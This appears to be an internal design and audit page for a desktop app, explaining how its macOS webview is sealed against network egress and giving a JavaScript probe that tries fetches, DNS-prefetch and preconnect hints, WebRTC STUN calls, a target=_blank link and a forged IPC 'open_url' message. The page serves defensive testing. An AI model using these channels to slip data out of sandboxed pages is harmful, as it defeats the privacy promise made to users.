---
generated_at_commit: dc47508dd5a002a702757f07edb38786af0043b7
---

# Live pages and the network: the seal

**A live page runs on the host, outside netgate, so every route from its
webview to a name or an address breaks the promise the model repeats to the
user: that nothing in the folder can be sent anywhere.** A content-security
policy governs what a document fetches; it does not govern what the engine does
on a document's behalf. On macOS the frame is therefore *sealed*: three
settings applied when the webview is created, each closing a class of channel
the others leave open, and a proof token that keeps every page off until all
three are in force. On Windows the frame is not sealed, and the promise is
false there.

[[decisions/261027_live-pages-run-sealed|live-pages-run-sealed]] holds the
frame's design: scheme, CSP, inert shell. This page holds what that design
cannot guarantee by itself, and the audit that measures it.

## What the promise says

- **The text.** `synod/data/network.md` tells the model that "nothing in this
  folder can be sent anywhere by any route"; `synod/data/live.md` tells it that
  a page "cannot reach the network".
- **A name is a message.** A lookup of a hostname the page chose carries the
  page's bytes to a resolver, with no connection to the named host and no
  answer needed. Egress is therefore not "a connection was made" but "a datum
  the page chose left the machine".
- **Beyond the door.** The guest's egress is a destination policy at one door
  ([[design/egress|egress]]). A page runs on the host, past that door; the
  webview's own configuration is its only barrier.

## What a page can make the webview do

**The frame's CSP closes what the document fetches. The engine does four
further things on a document's behalf, and each needs a switch of its own.**

| The page can cause the webview to | CSP governs it | Closed by |
|---|---|---|
| fetch a resource: script, request, image, font, media file, socket, subframe, worker script | yes | the frame CSP (`default-src 'none'`), repeated by the content rule list |
| resolve a name it never fetches from (`rel=dns-prefetch`) | no | the content rule list |
| open a connection ahead of any fetch (`rel=preconnect`) | no | empty `allowedNetworkHosts`, or the content rule list |
| the same, from a link to a new window that it makes by script (`target=_blank`) | no | empty `allowedNetworkHosts` |
| gather ICE candidates: resolve a STUN or TURN name and send it a packet | no | `peerConnectionEnabled` off |

- **`X-DNS-Prefetch-Control: off` is not a closure in WebKit.** The frame sends
  it on every response, and the hints are honoured regardless.
- **A blocked pop-up is not a blocked connection.** The `target=_blank` link
  opens no window in the sealed frame and still makes the engine connect to the
  name the page chose, whatever the frame's CSP, the content rules and the
  navigation guard say. The probe's `blank` button is its test.
- **The classes are measured, not derived.** The column on the right is read off
  the table in the audit log below; an engine update can move a channel from one
  row to another.

## The seal (macOS)

**The seal is three settings on the webview's configuration, applied before the
webview exists.** None is sufficient alone: each single setting measured leaks,
so does the one pair measured, and only the three together leak nothing.

| Setting | Kind | Closes |
|---|---|---|
| `allowedNetworkHosts` = the empty set | private property of `WKWebViewConfiguration`, set by key-value coding; must precede webview creation | connection warm-up: the `preconnect` hint and the script-made `target=_blank` link |
| `peerConnectionEnabled` = false | private property of `WKPreferences`, by key-value coding | WebRTC: `RTCPeerConnection` is undefined, so no ICE gathering, no STUN or TURN lookup, no packet |
| a `WKContentRuleList` blocking `^https?:` and `^wss?:` | public API, added to the user content controller | name resolution from `dns-prefetch`; repeats the CSP for every load |

- **One hook, at creation.** `synod/src/window/seal.rs` (macOS only) hands the
  three to Tauri's `WebviewWindowBuilder::with_webview_configuration`. A
  configuration can be given only when the webview is built, so the main window
  is created in code, in `setup` (`"create": false` in `tauri.conf.json`).
- **The seal is per webview.** The main page is sealed with its frame; it loads
  nothing from the network (`synod/ui/vendor/README.md`), so it loses nothing.
- **The development origin.** The rule list blocks every `http(s)` load in the
  main webview, so a `devUrl` in `tauri.conf.json` would lose that origin's
  resource loads in a debug build on macOS. Synod configures none, so this is
  moot today; `is_dev_server` in `main.rs` is the navigation guard's separate,
  debug-only allowance for such an origin.
- **Left out.** WebKit's Lockdown Mode and a dead proxy were measured and are
  not part of the seal: alone, each leaves channels open. Neither was measured
  in combination.

## Fail closed

**A live page runs only once the seal is proven.** `Sealed` is a zero-sized
token. It is built in `seal.rs`, after all three settings have been applied and
the two private ones read back from the configuration, and only then managed as
Tauri state. The `synod-live` handler serves the frame shell only if that state
exists. Otherwise it answers 503, the frame never posts `ready`, and no page
source is sent.

- **A token, not a flag.** A flag is a claim by whoever sets it: it can be set
  before the evidence, kept after the evidence changes, and its unset default is
  a choice someone must get right. The token is the evidence. It is built in
  one place, after the read-backs, and its absence is the failure state, which
  needs no code to be correct. The read-back makes "applied" mean that the
  configuration now holds the value, not that a call returned.
- **Why it matters here.** Two of the three settings are private API. A future
  macOS may rename or remove one; the setter then fails, or does nothing, and an
  unsealed webview would run pages exactly as before. That is why the private
  two are read back. Under the token that failure is loud and total: a message
  on stderr and live pages off, never pages running unsealed.
- **What the token does not prove.** It proves the three settings are in force,
  not that three settings suffice. Sufficiency is the audit's, and is
  re-measured when the engine changes.

## Windows

**Live pages are enabled on Windows and the frame is not sealed.** The
sentences in `synod/data/network.md` and `synod/data/live.md` that call a page
sealed are therefore false on Windows today. This is a gap the owner has
accepted.

- **What carries over.** The frame's design is the same: opaque origin, CSP,
  closed server, inert shell, no bridge. None of it has been measured on
  Windows.
- **Open channels.** DNS names through link hints; WebRTC and its STUN lookups;
  the script-made `target=_blank` connection; and anything peculiar to one
  engine. No Windows run exists to measure them, and the macOS table measures
  WebKit only.
- **No known WebRTC switch.** No documented way to turn WebRTC off in WebView2
  was found.
- **Candidate closures, untried.** Each is a new design decision, not applied:
  - `additionalBrowserArgs` with `--host-resolver-rules="MAP * ~NOTFOUND"`, for
    names.
  - `additionalBrowserArgs` with a dead `--proxy-server`.
  - Chromium's `--force-webrtc-ip-handling-policy`: in Chromium only
    `content_shell` and headless read it, and no effect on WebView2 is verified.

## What the model may be told

**A promise to the model is as strong as the last passing audit on that
platform, and no stronger.**

| Platform | What the text may say |
|---|---|
| macOS, seal in force | that a page reaches no network, once the owner's re-run row of the log reads pass; until then the claim rests on the harness measurements, taken on a copy of the frame |
| macOS, seal not in force | nothing about pages: none runs |
| Windows | no more than that the frame's CSP names no network source; whether names or packets leave is open (Windows above) |

The two files carry the sealed claim without a platform split, so as written
they overstate Windows. This page does not reword them.

## The audit

**The audit is the evidence; the settings are the hypothesis it tests.** Re-run
it when WebKit changes (a macOS update), when Tauri or wry is bumped, after any
edit to `seal.rs`, to the frame's headers or CSP in `live.rs`, or to the
navigation guard, and before shipping any Windows closure.

- **The pages are run by the assistant.** Build and launch synod
  (`cargo run -p synod`); ask the assistant to repeat a page verbatim inside a
  `live-html` fence. Each page below is shown exactly as it must be repeated.
- **Watch the wire, not the policy.** A capture of port 53 misses a name the
  system cache answers, so flush before the run. A connection can follow a
  cached lookup, so watch connections as well as names.
- **A new setting is measured on a harness first.** The log's measurements use a
  bare `WKWebView` that copies synod's frame (shell, scripts, headers, CSP,
  sandbox, navigation guard), with local listeners (HTTP, TCP, a logging
  `CONNECT` proxy, a STUN responder, a QUIC sink) and the `mDNSResponder`
  unified log as observation points, one configuration per run. It is not in
  this repository.
- **If anything leaks: stop.** Report the probe table and the captures to the
  owner; do not patch. A closure is a design decision.

### Egress probe page

Run captures alongside:

- macOS: flush with `sudo dscacheutil -flushcache; sudo killall -HUP mDNSResponder`.
  Names: `sudo tcpdump -l -n -i any port 53 | grep -iE 'probe-|example\.com|stun'`.
  Connections: `sudo tcpdump -l -n -i any 'tcp[tcpflags] & tcp-syn != 0 and port 443'`.
- Windows: `ipconfig /flushdns` before; `ipconfig /displaydns | findstr /i "probe- example.com stun"` after.

**Pass (macOS, sealed):**

- Every row reads `sealed`; the two informational rows always do, their detail
  column reporting whether a handler exists. The `worker` row does because the
  worker never ran; the `webrtc` row's detail is `absent`, since
  `RTCPeerConnection` is undefined.
- No navigation button changes what the frame shows. `blank` makes no
  connection and no lookup of `example.com`, and its pop-up stays blocked.
- No `probe-…`, `example.com` or `stun` name appears in the DNS capture, and no
  SYN goes to the address `example.com` resolves to.
- The forged `open_url` (the `// 1. bridges` block of the page) is rejected:
  on macOS through the WebKit handler, on Windows through `chrome.webview`.
  Synod's stderr (debug build) shows the invoke-key rejection and no browser
  opens. The two informational rows may legitimately show a handler present:
  it is the key, not the handler's absence, that seals the bridge.

**Windows:** the same criteria are the target, and a run is expected to fail
them until a closure exists (Windows above); record exactly what leaks.

The `spin 10 s` button records whether a runaway page freezes synod's composer;
it is recorded, not gating.

```live-html
<style>td{padding:2px 8px;font:12px var(--mono)}.ok{color:var(--accent)}.bad{color:var(--danger)}</style>
<table id="r"></table>
<p>
  <button id="nav">navigate self</button> <button id="meta">meta refresh</button>
  <button id="link">click link</button> <button id="top">navigate top</button>
  <button id="pop">pop-up</button> <button id="form">submit form</button>
  <button id="blank">target blank</button>
  <button id="spin">spin 10 s</button>
</p>
<p id="tag"></p>
<script>
const REMOTE = "https://example.com/";
const TAG = "probe-" + Math.random().toString(36).slice(2, 8);
document.getElementById("tag").textContent = "DNS watch: " + TAG;
const rows = document.getElementById("r");
function report(name, sealed, detail) {
  const tr = rows.insertRow();
  tr.insertCell().textContent = name;
  const c = tr.insertCell(); c.textContent = sealed ? "sealed" : "LEAK"; c.className = sealed ? "ok" : "bad";
  tr.insertCell().textContent = String(detail);
}
const violations = [];
addEventListener("securitypolicyviolation", (e) => violations.push(e.effectiveDirective));

// 1. bridges
report("__TAURI_INTERNALS__", typeof window.__TAURI_INTERNALS__ === "undefined", typeof window.__TAURI_INTERNALS__);
report("__TAURI__", typeof window.__TAURI__ === "undefined", typeof window.__TAURI__);
report("webkit handlers (informational)", true, !!window.webkit?.messageHandlers);
report("chrome.webview (informational)", true, !!window.chrome?.webview);
try { window.webkit?.messageHandlers?.ipc?.postMessage(JSON.stringify({ cmd: "open_url", callback: 0, error: 0, payload: { url: REMOTE } })); } catch {}
try { window.chrome?.webview?.postMessage(JSON.stringify({ cmd: "open_url", callback: 0, error: 0, payload: { url: REMOTE } })); } catch {}

// 2. fetch family
const attempt = (name, f) => f().then(() => report(name, false, "completed"), (e) => report(name, true, e?.name || e));
attempt("fetch", () => fetch(REMOTE + "?" + TAG, { mode: "no-cors" }));
attempt("xhr", () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", REMOTE); x.onload = ok; x.onerror = () => no("error"); x.send(); }));
attempt("websocket", () => new Promise((ok, no) => { const w = new WebSocket("wss://example.com/"); w.onopen = ok; w.onerror = () => no("error"); }));
attempt("eventsource", () => new Promise((ok, no) => { const s = new EventSource(REMOTE); s.onopen = ok; s.onerror = () => no("error"); }));
// a blocked Worker script does not throw: it queues an error event
attempt("worker", () => new Promise((ran, no) => { const w = new Worker(URL.createObjectURL(new Blob(["postMessage(1)"], { type: "text/javascript" }))); w.onmessage = ran; w.onerror = () => no("error"); setTimeout(() => no("silent"), 2000); }));
try { navigator.sendBeacon(REMOTE, TAG); } catch {}

// 3. subresources
const img = new Image(); img.onload = () => report("img", false, "loaded"); img.onerror = () => report("img", true, "error"); img.src = REMOTE + "favicon.ico";
const css = document.createElement("div"); css.style.backgroundImage = `url(${REMOTE}bg.png)`; document.body.append(css);
const font = new FontFace("x", `url(${REMOTE}x.woff2)`); font.load().then(() => report("font", false, "loaded"), () => report("font", true, "error"));
const sub = document.createElement("iframe"); sub.src = REMOTE; document.body.append(sub);
const media = document.createElement("audio"); media.src = REMOTE + "a.mp3"; media.onerror = () => report("media", true, "error"); media.load();

// 4. hints CSP does not govern
for (const rel of ["dns-prefetch", "preconnect", "prefetch"]) {
  const l = document.createElement("link"); l.rel = rel; l.href = `https://${rel}-${TAG}.example.com/`; document.head.append(l);
}

// 5. WebRTC: a reflexive candidate means a STUN server answered over UDP
if (typeof RTCPeerConnection === "undefined") report("webrtc", true, "absent");
else {
  let reflexive = false;
  const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
  pc.onicecandidate = (e) => { if (e.candidate && / typ (srflx|relay) /.test(e.candidate.candidate)) reflexive = true; };
  pc.createDataChannel("x");
  pc.createOffer().then((o) => pc.setLocalDescription(o));
  setTimeout(() => report("webrtc", !reflexive, reflexive ? "a STUN server answered" : "no reflexive candidate in 5 s"), 5000);
}
setTimeout(() => report("csp violations seen", true, violations.join(" ")), 6000);

// 6. navigations, one per click: the frame must not change
const click = (id, f) => document.getElementById(id).addEventListener("click", f);
click("nav", () => { location.href = REMOTE + "?" + TAG; });
click("meta", () => { const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + REMOTE; document.head.append(m); });
click("link", () => { const a = document.createElement("a"); a.href = REMOTE; document.body.append(a); a.click(); });
click("top", () => { try { top.location = REMOTE; } catch (e) { report("top", true, e.name); } });
click("pop", () => report("pop-up", window.open(REMOTE) === null, "window.open"));
click("form", () => { const f = document.createElement("form"); f.method = "post"; f.action = REMOTE; document.body.append(f); f.submit(); });
click("blank", () => { const a = document.createElement("a"); a.href = REMOTE; a.target = "_blank"; document.body.append(a); a.click(); });
// 7. a runaway page: is synod's composer still responsive? (recorded, not gating)
click("spin", () => { const t = Date.now() + 10000; while (Date.now() < t) {} });
</script>
```

### Smoke page

**Pass:** each library renders. The KaTeX fonts load (CORS), the three.js
module imports (CORS), and the frame resizes as content grows and shrinks.
After clicking "full height" (`html { height: 100% }`) the frame keeps its size
(no growth loop), and "shrink" or a reload (re-render of the message) restores
normal behaviour. The placeholder shows while the fence streams. The page
follows light and dark.

```live-html
<h3 style="margin:0 0 8px">Smoke</h3>
<canvas id="c" height="120"></canvas>
<div id="d"></div>
<pre class="mermaid">flowchart LR; Draft --> Review --> Sent</pre>
<div id="k"></div>
<canvas id="t" width="200" height="120"></canvas>
<button id="grow">grow</button> <button id="shrink">shrink</button> <button id="full">full height</button>
<div id="box" style="height:20px;background:var(--accent)"></div>
<link rel="stylesheet" href="vendor/katex/katex.min.css">
<script src="vendor/chartjs/chart.umd.min.js"></script>
<script src="vendor/d3/d3.min.js"></script>
<script src="vendor/mermaid/mermaid.min.js"></script>
<script src="vendor/katex/katex.min.js"></script>
<script>
new Chart(document.getElementById("c"), { type: "bar", data: { labels: ["Jan", "Feb", "Mar"], datasets: [{ label: "Paid", data: [38, 41, 29] }] } });
d3.select("#d").text("d3 " + d3.version + ": " + d3.format(",.2f")(1234567.891));
mermaid.initialize({ startOnLoad: true });
katex.render("\\sum_{i=1}^n i = \\tfrac{n(n+1)}{2}", document.getElementById("k"));
const box = document.getElementById("box");
document.getElementById("grow").onclick = () => { box.style.height = box.offsetHeight + 200 + "px"; };
document.getElementById("shrink").onclick = () => { box.style.height = "20px"; };
document.getElementById("full").onclick = () => { document.documentElement.style.height = "100%"; };
</script>
<script type="module">
import * as THREE from "./vendor/three/three.module.min.js";
const r = new THREE.WebGLRenderer({ canvas: document.getElementById("t") });
const s = new THREE.Scene(), cam = new THREE.PerspectiveCamera(50, 200 / 120, 0.1, 10); cam.position.z = 3;
const m = new THREE.Mesh(new THREE.BoxGeometry(), new THREE.MeshNormalMaterial()); s.add(m);
(function f() { m.rotation.y += 0.02; r.render(s, cam); requestAnimationFrame(f); })();
</script>
```

## Audit log

Each run records the platform, the WebView version, the smoke result, the probe
table and the captures. Fields not yet run are blank.

| Run | Platform, WebView | Smoke | Probe table | Captures |
|---|---|---|---|---|
| Owner, before the seal | macOS, WKWebView; version not recorded | not recorded | two `LEAK` rows, one a probe bug; below | four lookups, below |
| Harness, one setting per run | macOS 27.0.1, WebKit 22625.1.29.11.28 | not run | the harness's own probe, not this page; below | listeners and unified log; below |
| Owner re-run against the sealed app | macOS, WKWebView | | | |
| Owner, Windows | Windows, WebView2 | not run | not run | not run |

### Owner's run, macOS, before the seal

The probe as it read then, with `sudo tcpdump -l -n -i any port 53` alongside
(`pu31w1` was that run's `TAG`).

| Name looked up | Record |
|---|---|
| `dns-prefetch-probe-pu31w1.example.com` | A |
| `preconnect-probe-pu31w1.example.com` | Type65 |
| `preconnect-probe-pu31w1.example.com` | A |
| `stun.l.google.com` | A |

The `prefetch` hint produced no lookup in this capture.

| Row | Verdict | Detail |
|---|---|---|
| `__TAURI_INTERNALS__` | sealed | `undefined` |
| `__TAURI__` | sealed | `undefined` |
| webkit handlers (informational) | sealed | `true` |
| chrome.webview (informational) | sealed | `false` |
| websocket | sealed | `SecurityError` |
| eventsource | sealed | `SecurityError` |
| worker | LEAK | `completed` |
| font | sealed | `error` |
| fetch | sealed | `TypeError` |
| xhr | sealed | `error` |
| img | sealed | `error` |
| media | sealed | `error` |
| webrtc | LEAK | `a STUN server answered` |
| csp violations seen | sealed | `connect-src connect-src connect-src connect-src worker-src connect-src img-src font-src frame-src img-src media-src` |

- **`webrtc` is a real leak,** and the four lookups are real too: a STUN server
  answered, and names the page chose (the two hint names, the STUN server's)
  reached the resolver. The frame's CSP and `X-DNS-Prefetch-Control: off` do not
  govern them, and a hostname is itself a channel, so the promise of the first
  section was broken.
- **`worker` is a probe bug, not a leak.** The `Worker` constructor does not
  throw when the CSP blocks the script; WebKit queues an `error` event, so a
  probe that treats a returning constructor as success reads `completed`. The
  `worker-src` entry in the violations row shows the script was blocked. The
  probe above now reads a worker as `sealed` iff it never runs.
- **The `target=_blank` channel was not tested.** It is the `blank` button.

### Harness measurements, macOS

macOS 27.0.1, WebKit 22625.1.29.11.28, on the harness described in The audit.
Each row is a separate run of the same probe; "leaks" means observed at a
listener or in DNS.

| Settings applied | Leaks |
|---|---|
| none | DNS for `dns-prefetch`, `preconnect`, STUN/TURN names; TCP connections (`preconnect`); STUN packets answered |
| content rule list only | STUN (and its DNS); a `target=_blank` anchor still makes TLS connections |
| `allowedNetworkHosts` empty only | DNS for `dns-prefetch` and STUN/TURN names; STUN packets |
| `allowedNetworkHosts` empty + WebRTC off | DNS for `dns-prefetch` only |
| WebRTC off only | TCP (`preconnect`) and DNS for `dns-prefetch`, `preconnect` |
| a dead proxy only | STUN, TCP |
| Lockdown Mode only | TCP, DNS (`dns-prefetch`, `preconnect`) |
| all three (the seal) | nothing: no connection, no DNS, `RTCPeerConnection` undefined |

- **The fifth channel.** A script-made `target=_blank` link makes WebKit
  connect (DNS, TCP, TLS) to a name the page chose, regardless of the frame's
  CSP, the content rules and the navigation guard. Empty `allowedNetworkHosts`
  closes it; the content rules do not.

## Where

- `synod/src/window/seal.rs` (macOS only): the three settings and `Sealed`.
  `synod/src/window/live.rs` serves the shell only once `Sealed` exists. The
  main window is built in `setup`. [[map/synod|synod]] locates the code.
- `synod/data/network.md` and `synod/data/live.md`: the promises this page
  audits.
- `synod/ui/vendor/README.md` runs the smoke page when a library is updated.

## See also

[[decisions/261027_live-pages-run-sealed|live-pages-run-sealed]],
[[design/egress|egress]], [[map/synod|synod]],
[[design/two-enforcers|two-enforcers]] for the same split between a policy and
the layer that enforces what it cannot see.
